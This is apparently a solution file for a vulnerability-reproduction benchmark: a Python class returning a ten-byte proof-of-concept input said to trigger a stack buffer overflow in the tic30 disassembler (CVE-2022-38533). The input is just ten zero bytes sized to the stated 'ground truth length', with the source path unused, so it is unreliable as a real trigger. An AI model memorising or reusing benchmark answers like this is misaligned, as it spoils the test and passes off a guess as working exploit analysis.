import os
import tarfile
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Known exploit for CVE-2022-38533 in tic30-dis.c
        # The vulnerability is in print_branch function where operand array
        # has incorrect size causing stack buffer overflow
        # Ground truth length is 10 bytes
        poc = b"\x00" * 10
        return poc